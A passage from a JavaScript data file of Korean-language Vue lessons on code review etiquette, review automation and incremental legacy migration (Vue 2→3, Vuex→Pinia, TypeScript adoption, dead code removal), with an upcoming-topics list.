// [ ] 모킹이 경계(HTTP) 에서 이뤄지고 내부 모듈을 갈아 끼우지 않는가
// [ ] 단언이 결과(화면·반환값·저장된 상태) 를 보는가, 호출 여부만 보지 않는가
// [ ] 테스트를 지워도 통과할 구현 변경이 있나 → 그 테스트는 가짜
// [ ] 실패 케이스(오류 응답, 빈 입력) 가 하나 이상 있는가
// 빠진 케이스는 "이 경우도 테스트에 넣어 주세요: 재고 0 + 쿠폰" 처럼 구체적으로
`,
        },
        {
          id: 'l7', short: `코멘트`,
          title: `코멘트는 중요도 접두사, 질문형, 코드 제안으로. 칭찬도 적는다`,
          why: `"이거 왜 이렇게 했어요?" 는 공격으로 읽힙니다. nit/suggestion/question/must 접두사로 무게를 밝히고, 대안은 말로 설명하지 말고 suggestion 블록으로 넣어 한 번에 반영되게 합니다. 잘한 점을 적으면 다음 PR 에서 그 패턴이 늘어납니다.`,
          bad: String.raw`
"이건 아니죠"
"왜 watch 씀?"
"여기 고치세요" (뭘 어떻게?)
`,
          good: String.raw`
must: 이 핸들러는 권한 확인 없이 다른 사용자의 주문을 반환합니다. requireUser 뒤에 userId 비교가 필요해요.

suggestion: watch 대신 computed 로 두면 total 이 항상 items 와 맞을 것 같아요.
\`\`\`suggestion
const total = computed(() => items.value.reduce((s, i) => s + i.price, 0))
\`\`\`

question: 필터 변경 때 page 를 1 로 되돌리는데, 정렬 변경 때는 그대로 두는 이유가 있을까요? (26회차 l4 참고)

nit: 이름이 data 라 어떤 데이터인지 한 번 더 읽게 돼요. orders 는 어떨까요? (무시하셔도 됩니다)

praise: 서버 오류를 setErrors 로 필드에 붙인 부분 좋네요. 다른 폼에도 같은 패턴 쓰면 좋겠어요.
`,
        },
        {
          id: 'l8', short: `리뷰어 태도`,
          title: `하루 안에 첫 응답, 막는 건 must 만, 저자의 선택을 존중한다`,
          why: `리뷰 대기는 가장 비싼 낭비입니다. 완벽한 리뷰를 사흘 뒤에 주느니 "오늘 저녁에 보겠다" 를 한 시간 안에 알리는 게 낫습니다. 그리고 "내 방식과 다름" 은 막을 이유가 아닙니다. 요구사항 불일치, 보안, 데이터 손상, 명백한 버그만 must 이고 나머지는 저자가 결정합니다.`,
          bad: String.raw`
# PR 열림 → 3일 침묵 → "전체적으로 다시 생각해 보시죠" → 저자는 이미 다음 작업 중
# 취향(네이밍, 파일 분리) 으로 approve 보류
`,
          good: String.raw`
# 팀 규칙 (CONTRIBUTING.md)
- 리뷰 요청은 업무일 기준 24시간 안에 첫 응답 (리뷰 완료가 아니라 응답). 못 하면 다른 리뷰어에게 넘긴다
- 리뷰어는 하루 시작에 리뷰 큐를 먼저 본다 (자기 코딩보다 먼저)
- 변경 요청(Request changes) 은 must 가 있을 때만. suggestion·nit 만 있으면 approve + 코멘트
- 리뷰어 둘이 의견이 갈리면 저자가 고른다. 셋째 사람을 부르지 않는다
- 큰 방향 이슈는 PR 이 아니라 설계 단계(이슈·짧은 통화) 에서. PR 에서 "처음부터 다시" 는 리뷰어가 늦은 것
`,
        },
        {
          id: 'l9', short: `저자 대응`,
          title: `모든 코멘트에 답하고 반영 여부를 밝힌다. 세 번 오가면 통화로 바꾼다`,
          why: `코멘트 10개 중 7개만 고치고 조용히 푸시하면 리뷰어는 다시 전부 읽어야 합니다. "반영했습니다 / 이유가 있어 유지합니다(이유) / 별도 이슈로" 셋 중 하나로 답하면 리뷰어는 답만 봅니다. 글로 세 번 넘게 오가는 논쟁은 5분 통화가 빠릅니다.`,
          bad: String.raw`
# 코멘트 10개 → 커밋 "리뷰 반영" → 어떤 걸 반영했는지 모름 → 리뷰어 전체 재검토
# 의견 차이를 코멘트 15개 스레드로
`,
          good: String.raw`
# 각 코멘트에
- "반영했습니다 (a1b2c3d)"
- "유지하려고 합니다: 이 경로는 관리자만 오고 서버에서 다시 검증해서요. 괜찮을까요?"
- "맞아요, 범위가 커서 #421 로 뺐습니다"
# 반영 커밋은 리뷰 단위로 (fixup 커밋, 머지 때 squash) → 리뷰어가 "변경 사항만 보기" 로 본다
# 답이 세 번 오가면: "10분 통화할까요?" → 결론을 스레드에 한 줄로 남긴다
# 반영 끝나면 명시적으로 re-request review. 조용한 푸시는 알림이 안 간다
`,
        },
        {
          id: 'l10', short: `자동화`,
          title: `사람이 볼 것만 남도록 린트·타입·테스트·번들 크기·체크리스트를 봇에게 넘긴다`,
          why: `리뷰어의 집중력은 한정 자원입니다. 타입 오류, 테스트 실패, 번들 50KB 증가, 스토리 누락은 봇이 PR 에 적게 하고 사람은 설계와 실패 경로만 봅니다. CODEOWNERS 로 리뷰어 지정을 자동화하고 PR 템플릿으로 설명 항목을 강제합니다.`,
          bad: String.raw`
# 리뷰어가 로컬에 체크아웃해서 테스트 돌리고 번들 크기 재고 타입 검사
`,
          good: String.raw`
# .github/pull_request_template.md
## 왜
## 무엇
## 확인 방법
- [ ] 테스트 추가/수정
- [ ] 프리뷰에서 확인
- [ ] 실패 경로 (오류/빈/로딩) 확인

# CI (PR 마다): lint, typecheck (vue-tsc --noEmit), vitest --changed, e2e smoke, build
# 봇 코멘트: 번들 크기 diff (size-limit-action / nuxt analyze), 커버리지 diff, Chromatic 링크(35회차), Lighthouse CI(23회차)
# .github/CODEOWNERS
/packages/ui/         @design-system-team
/server/api/payments/ @payments-team
# danger.js / reviewdog: 설명 비어 있으면 실패, 500줄 넘으면 경고, 마이그레이션 파일 있으면 DBA 태그
`,
        },
      ],
    },
    {
      id: 'vue-40', no: 40, name: `레거시 코드 개선 전략`,
      lead: `Vue 2, Options API, Vuex, 거대 컴포넌트, any 투성이 코드를 멈추지 않고 고치는 습관입니다. 안전망을 먼저 깔고, 다시 쓰지 않고 감싸고, 손대는 파일만 바꾸고, 측정으로 보고합니다.`,
      lessons: [
        {
          id: 'l1', short: `안전망`,
          title: `테스트 없는 레거시는 고치기 전에 특성 테스트와 스모크 E2E 를 먼저 깐다`,
          why: `"무엇이 맞는 동작인지" 아무도 모르는 코드는 현재 동작을 그대로 적은 테스트(특성 테스트) 가 기준입니다. 리팩터링 뒤 그 테스트가 깨지면 "바뀌었다" 는 걸 알 수 있습니다. 핵심 흐름 다섯 개를 E2E 로 묶어 두면 큰 변경도 밤에 잘 수 있습니다.`,
          bad: String.raw`
# "리팩터링하면서 테스트도 같이 짜겠습니다" → 리팩터링 뒤 테스트 → 바뀐 동작을 정답으로 적는다
`,
          good: String.raw`
// 1) 특성 테스트: 현재 출력을 그대로 굳힌다 (맞는지 묻지 않는다)
it('calcShipping — 현재 동작', () => {
  expect(calcShipping({ total: 29999, region: 'jeju' })).toMatchInlineSnapshot(\`6000\`)
  expect(calcShipping({ total: 30000, region: 'jeju' })).toMatchInlineSnapshot(\`3000\`)   // 이게 버그라도 일단 기록
  expect(calcShipping({ total: 0, region: 'seoul' })).toMatchInlineSnapshot(\`0\`)
})
// 2) 스모크 E2E 5개: 로그인, 검색→상세, 장바구니→결제 진입, 마이페이지, 관리자 목록 (21회차)
// 3) 그 다음에 리팩터링. 특성 테스트가 깨지면 "의도한 변화인가" 를 묻고 테스트를 고친다
// 버그로 확인된 것은 이슈로 적고, 리팩터링 PR 에서 고치지 않는다 (l10)
`,
        },
        {
          id: 'l2', short: `감싸기`,
          title: `전면 재작성은 금지. 새 코드는 새 방식으로 쓰고 옛 코드는 경계 뒤에서 서서히 줄인다`,
          why: `"3개월이면 새로 짭니다" 는 늘 9개월이 되고, 그 사이 옛 코드에 기능이 추가됩니다. 스트랭글러 패턴은 새 라우트·새 기능을 새 방식으로 만들고 옛 코드는 호출만 받게 경계를 둡니다. 옛 코드는 호출이 0 이 되는 순간 지웁니다.`,
          bad: String.raw`
# feature/rewrite 브랜치 6개월. main 과 400 커밋 차이. 머지 불가
`,
          good: String.raw`
# 경계 두기
# legacy/           ← 옛 코드. 새 import 금지 (eslint no-restricted-imports: 'legacy/*' from 'src/**')
# src/              ← 새 코드. legacy 를 부를 땐 adapters/ 를 통해서만
# adapters/legacyOrders.ts — 옛 API 모양을 새 타입으로 변환하는 얇은 층
export async function getOrders(): Promise<Order[]> {
  const raw = await legacyApi.fetchOrderList()         // 옛 함수
  return raw.map(toOrder)                                // 새 타입
}
# 규칙: 새 화면은 src/ 에만. 옛 화면을 고칠 일이 생기면 "고치면서 src/ 로 옮길 수 있나" 먼저 본다
# 측정: legacy/ 의 파일 수·라인 수를 매주 그래프로. 줄지 않으면 전략을 바꾼다
`,
        },
        {
          id: 'l3', short: `Vue 2 → 3`,
          title: `마이그레이션 빌드(compat) 로 올린 뒤 경고를 하나씩 끄고, 호환 모드를 마지막에 제거한다`,
          why: `@vue/compat 은 Vue 3 런타임에 Vue 2 동작을 흉내 내는 층을 얹어 앱을 일단 돌게 합니다. 콘솔 경고가 "무엇을 고쳐야 하는지" 목록이 됩니다. 필터, 이벤트 버스($on), $listeners, 함수형 컴포넌트, v-model 변경이 큰 덩어리입니다.`,
          bad: String.raw`
# vue@3 으로 올리고 빌드 → 오류 200개 → 포기 → 6개월 뒤 다시
`,
          good: String.raw`
# 1) 의존성 먼저: Vue 3 지원 버전으로 (vue-router@4, vuex@4 또는 pinia, vue-i18n@9, UI 라이브러리 v3 대응판)
# 2) @vue/compat 로 전환
// vite.config: alias { vue: '@vue/compat' }, vue 플러그인 template.compilerOptions.compatConfig = { MODE: 2 }
// main.ts: configureCompat({ MODE: 2 })   → 앱이 Vue 2 모드로 돈다. 경고 목록 수집
# 3) 경고 유형별로 끈다 (많은 순)
//  - filters → 메서드/computed, 전역이면 app.config.globalProperties.$filters
//  - $on/$off 이벤트 버스 → mitt 또는 provide/inject, Pinia
//  - v-model (value/input) → modelValue/update:modelValue
//  - $listeners / $scopedSlots → $attrs / $slots
//  - 함수형 컴포넌트 functional: true → 일반 컴포넌트
//  각 유형을 끌 때 configureCompat({ FILTERS: false }) 로 "더 이상 허용 안 함" 을 고정 → 회귀 방지
# 4) 모든 플래그가 false → compat 제거, vue 로 alias 복귀. 특성 테스트·E2E 가 안전망 (l1)
`,
        },
        {
          id: 'l4', short: `Options → Composition`,
          title: `Options API 는 그대로 둬도 된다. 손대는 파일만, 로직 추출 순서대로 옮긴다`,
          why: `Options API 는 Vue 3 에서 1급입니다. 안 건드리는 파일을 "현대화" 하려고 여는 건 위험만 있습니다. 기능 변경으로 여는 파일에서, 그 파일이 커서 쪼개야 할 때만 옮깁니다. 옮길 땐 data→ref, computed→computed, methods→함수, watch→watch, 훅→on* 순서로 기계적으로 하고 동작은 바꾸지 않습니다.`,
          bad: String.raw`
# 스프린트 목표: "모든 컴포넌트 Composition API 전환" → 200 파일, 기능 변경 0, 회귀 12건
`,
          good: String.raw`
// 기준: (a) 이 파일을 기능 때문에 열었고 (b) 300줄 넘거나 (c) 로직을 다른 곳과 공유해야 할 때
// 순서 (한 커밋에 하나)
// 1. data() → ref/reactive. this.x → x.value. 템플릿은 그대로
// 2. computed → computed(() => ...)
// 3. methods → 함수. this 제거
// 4. watch → watch(source, cb)
// 5. created/mounted/beforeDestroy → setup 본문 / onMounted / onUnmounted
// 6. mixins → 같은 이름의 컴포저블 (mixin 이 쓰던 this.* 는 인자로)
// 7. 그제서야 로직 묶음을 composables/useXxx.ts 로 추출 (테스트는 36회차 l3)
// 각 단계마다 특성 테스트·스토리 통과. 템플릿은 마지막까지 안 건드린다
// 자동 변환 도구(vue-composition-converter 등) 는 초안으로만, 결과를 반드시 읽는다
`,
        },
        {
          id: 'l5', short: `Vuex → Pinia`,
          title: `Vuex 와 Pinia 는 공존한다. 모듈 하나씩 옮기고, 컴포넌트가 둘 다 안 보게 한다`,
          why: `Vuex 스토어를 하루에 바꿀 수는 없습니다. 둘 다 설치하고 모듈 단위로 옮기면 됩니다. mutations 는 사라지고 actions 가 상태를 직접 바꾸며, getters 는 computed 가 됩니다. 옮기는 동안 컴포넌트가 this.$store 와 useXStore 를 섞어 쓰지 않게 컴포저블로 가립니다.`,
          bad: String.raw`
// 한 컴포넌트에서 this.$store.state.cart 와 useUserStore() 를 동시에
`,
          good: String.raw`
// 1) 가리기: 컴포넌트는 useCart() 만 안다
// composables/useCart.ts (옮기기 전)
export function useCart() { const store = useStore(); return { items: computed(() => store.state.cart.items), add: (p) => store.dispatch('cart/add', p) } }
// 2) Pinia 로 모듈 이전
export const useCartStore = defineStore('cart', () => {
  const items = ref<Item[]>([])
  const total = computed(() => items.value.reduce((s, i) => s + i.price * i.qty, 0))     // getter
  async function add(p: Product) { items.value.push({ ...p, qty: 1 }); await syncServer() } // mutation+action 합침
  return { items, total, add }
})
// 3) useCart 의 내부만 교체 → 컴포넌트는 변경 없음
export function useCart() { const s = useCartStore(); return { items: computed(() => s.items), add: s.add } }
// 4) Vuex 모듈 삭제. 모든 모듈이 옮겨지면 useCart 는 useCartStore 로 치환 (한 줄 codemod)
// Vuex 플러그인(persist, logger) 은 Pinia 대응판으로 (pinia-plugin-persistedstate)
`,
        },
        {
          id: 'l6', short: `거대 컴포넌트`,
          title: `2,000줄 컴포넌트는 UI 를 자르기 전에 로직을 컴포저블로 먼저 뽑는다`,
          why: `템플릿을 먼저 자식으로 쪼개면 props·emit 이 수십 개 생기고 상태가 어디 있는지 더 혼란스러워집니다. 먼저 script 안의 "같이 움직이는 상태·함수 묶음" 을 컴포저블로 빼면 템플릿은 그대로인 채 script 가 줄고, 그 뒤 템플릿 영역을 자식으로 떼면 각 자식이 필요한 컴포저블만 받습니다.`,
          bad: String.raw`
# 1단계로 템플릿을 5개 자식으로 분리 → 부모에 props 40개, emit 25개, 상태는 여전히 부모 → 더 복잡
`,
          good: String.raw`
// OrderEditor.vue 2,000줄 →
// 1) script 에서 묶음 식별: 고객 검색 (searchQ, results, select...), 품목 (items, addItem, total...), 배송 (address, fee...), 저장 (save, dirty...)
// 2) 묶음마다 컴포저블로 추출. 컴포넌트는 호출만. 템플릿 변경 없음
const customer = useCustomerPicker()
const items = useOrderItems()
const shipping = useShipping(items.total)
const { save, dirty } = useOrderSave({ customer, items, shipping })
// 템플릿의 searchQ → customer.searchQ 로 바꾸는 건 찾아바꾸기. 각 추출마다 커밋 + 특성 테스트
// 3) 이제 템플릿 영역을 자식으로: <CustomerPicker v-bind="customer" /> — 자식은 필요한 컴포저블 결과만 props 로
// 4) 공유 상태가 자식 셋 이상에 걸치면 그 묶음만 Pinia 로 (l5)
`,
        },
        {
          id: 'l7', short: `타입 도입`,
          title: `JS 레거시는 allowJs + checkJs 로 시작하고 strict 플래그를 하나씩 켠다. any 는 세고 줄인다`,
          why: `파일 전부를 .ts 로 바꾸고 strict 를 켜면 오류 3,000개에서 멈춥니다. JS 그대로 검사를 켜고(// @ts-check), 새 파일만 .ts 로, strict 옵션은 noImplicitAny → strictNullChecks 순으로 올리며, any 개수를 CI 에서 세어 늘지 않게 합니다.`,
          bad: String.raw`
# 전부 .ts 로 rename + strict: true → 오류 3,000 → 전부 // @ts-ignore 또는 as any
`,
          good: String.raw`
// tsconfig.json — 단계 1
{ "compilerOptions": { "allowJs": true, "checkJs": false, "strict": false, "noImplicitAny": false } }
// 단계 2: 파일 상단 // @ts-check 를 손대는 .js 파일마다 추가. 새 파일은 .ts
// 단계 3: "noImplicitAny": true  → 오류 난 곳만 명시 타입 (any 라도 명시적으로 적는다. 숨은 any 가 사라진다)
// 단계 4: "strictNullChecks": true (가장 큰 덩어리. 디렉터리별로 tsconfig 를 나눠 적용 가능)
// 단계 5: "strict": true, 나머지 .js → .ts

# any 예산: CI 에서 개수를 세고 기준보다 늘면 실패
grep -rE ":\s*any\b|as any|<any>" src --include=*.ts --include=*.vue | wc -l   # → 기준값 파일과 비교
# 외부 라이브러리 타입이 없으면 types/shims.d.ts 에 declare module 'x' 로 일단 막고 이슈로
# Vue 컴포넌트는 defineComponent 로 감싸야 Options API 에서도 this 타입이 나온다
`,
        },
        {
          id: 'l8', short: `도구 먼저`,
          title: `빌드 도구를 먼저 바꾸고 프레임워크는 나중에. Vue CLI → Vite, Nuxt 2 → Bridge → Nuxt 3`,
          why: `webpack 4 위에서 Vue 3 를 시도하면 로더·플러그인 호환까지 한꺼번에 싸웁니다. 빌드 도구를 Vite 로 먼저 바꾸면 그것만으로 개발 속도가 바뀌고 다음 단계의 변수가 줄어듭니다. Nuxt 2 는 Bridge 로 Nitro·Composition API 를 먼저 얻고, 그 다음 Nuxt 3 입니다.`,
          bad: String.raw`
# Vue CLI + Vue 2 + Vuex → 한 번에 Vite + Vue 3 + Pinia + TS. 2개월간 빌드가 안 됨
`,
          good: String.raw`
# 순서 (각 단계는 배포 가능 상태로 끝난다)
# 1. Vue CLI → Vite (Vue 2 그대로): @vitejs/plugin-vue2, 환경변수 VUE_APP_ → VITE_, require() → import, index.html 이동
# 2. Vue 2.7 (Composition API 내장) → 새 코드는 setup() 으로. @vue/composition-api 플러그인 제거
# 3. Vuex → Pinia (l5), 필터·이벤트 버스 제거 (l3 의 경고 목록 미리 줄이기)
# 4. Vue 3 (compat) → 플래그 끄기 → compat 제거
# 5. 라우터·i18n·UI 라이브러리 최신판

# Nuxt
# 1. Nuxt 2 → Nuxt Bridge: Nitro 서버, Composition API, Vite 를 Nuxt 2 위에서. 모듈 호환 확인
# 2. 페이지·컴포저블을 Nuxt 3 API (useFetch, defineNuxtConfig) 로 Bridge 안에서 전환
# 3. Nuxt 3 (또는 4) 로 — 남은 것은 디렉터리 구조와 모듈 교체
# Bridge 가 막는 모듈(오래된 auth, 특정 UI 모듈) 이 있으면 그 모듈 대체를 먼저 — 그것이 진짜 작업량
`,
        },
        {
          id: 'l9', short: `죽은 코드`,
          title: `안 쓰는 코드는 도구로 찾고, 의심되면 사용 로그를 심은 뒤 지운다. 주석 처리 코드는 즉시 삭제한다`,
          why: `레거시의 30% 는 아무도 안 부르는 코드입니다. 그 코드도 타입 검사·빌드·리뷰 비용을 먹습니다. knip 이 export 되고 import 안 되는 것을 찾아 주고, 라우트·기능은 사용 로그 한 달이면 답이 나옵니다. 주석 처리된 코드는 git 에 있으니 지웁니다.`,
          bad: String.raw`
// function oldCalc() { ... }  ← 2019년에 주석 처리. "혹시 몰라서"
// components/LegacyModal.vue — import 0 건, 그러나 "누가 쓸지 몰라" 유지
`,
          good: String.raw`
# 정적 탐지
pnpm dlx knip            # 안 쓰는 파일·export·의존성 목록
pnpm dlx depcheck        # package.json 에만 있는 의존성
# vue-tsc --noUnusedLocals, eslint no-unused-vars 는 CI 에서 error

# 동적 확인 (라우트·기능 단위)
// plugins/usage.client.ts — 의심 라우트에 진입 로그
router.afterEach((to) => { if (SUSPECT.has(to.name)) track('legacy_route', { name: to.name }) })
# 30일 0건 → 삭제 PR. 삭제 PR 은 "삭제만" (다른 변경 섞지 않는다). 되돌리기는 revert 한 번

# 주석 처리 코드: 보이는 즉시 삭제. 필요하면 커밋 해시를 코멘트에 적는다 ("이전 구현: a1b2c3d")
# 기능 플래그로 꺼 둔 코드: 플래그 만료일을 적고 지난 것은 지운다
`,
        },
        {
          id: 'l10', short: `예산`,
          title: `개선은 작게, 기능 티켓에 묶어, 동작 변경과 분리해, 숫자로 보고한다`,
          why: `"리팩터링 스프린트" 는 승인받기 어렵고 끝나도 아무도 모릅니다. 기능 작업마다 10~20% 를 그 주변 정리에 쓰면 꾸준히 줄어듭니다. 리팩터링 커밋은 동작 변경과 분리해야 리뷰와 롤백이 쉽습니다. 빌드 시간·번들·오류율·any 개수를 매달 보여 주면 다음 예산이 나옵니다.`,
          bad: String.raw`
# "이번 분기는 리팩터링만" → 비즈니스가 거절 → 리팩터링 0
# 또는 기능 PR 에 리팩터링 2,000줄 섞음 → 리뷰 불가, 회귀 시 전체 롤백
`,
          good: String.raw`
# 규칙
# - 기능 티켓마다 "주변 정리" 서브태스크 (보이스카우트: 온 곳보다 깨끗하게). 그 파일·그 함수까지만
# - PR 분리: ① 리팩터링 (동작 동일, 특성 테스트 통과) → ② 기능 변경. ①은 리뷰가 빠르고 ②는 diff 가 작다
# - 큰 이전(l3, l8) 은 단계마다 배포. "중간 상태로 2주" 가 정상

# 월간 지표 (대시보드 한 장)
# - legacy/ 라인 수, any 개수, Options API 파일 수 (줄어드는 그래프)
# - 빌드 시간, 번들 크기 (23회차), 테스트 수·커버리지(분기 있는 파일 기준)
# - 운영 오류율·프론트 오류 수 (27회차), 배포 빈도·롤백 횟수 (38회차)
# 보고: "지난 분기 legacy 31% → 22%, 빌드 4분 → 50초, JS 오류 주당 120 → 40" — 숫자가 다음 예산이다
`,
        },
      ],
    },
    // @@APPEND@@ 새 회차는 이 줄 위에 추가
  ],
  // 다음에 만들 묶음 예고. 없으면 null.
  upcoming: {
    name: `401~500번 후보 주제`,
    items: [
      `국제화 심화 (라우팅, 복수형, 날짜·통화 포맷)`,
      `애니메이션과 트랜지션 (Transition, Motion, View Transitions)`,
      `접근 가능한 컴포넌트 만들기 (headless UI, Reka UI)`,
      `서버 컴포넌트와 아일랜드 (NuxtIsland)`,
      `데이터 페칭 전략 심화 (TanStack Query, 캐시 무효화)`,
      `웹 워커와 무거운 계산 분리`,
      `브라우저 API 활용 (Clipboard, Share, IndexedDB, File System)`,
      `타입스크립트 고급 패턴 (제네릭 컴포넌트, 조건부 타입)`,
      `디자인 시스템 운영 (버전, 변경 로그, 폐기 정책)`,
      `팀 컨벤션과 온보딩 문서`,
    ],
  },
};
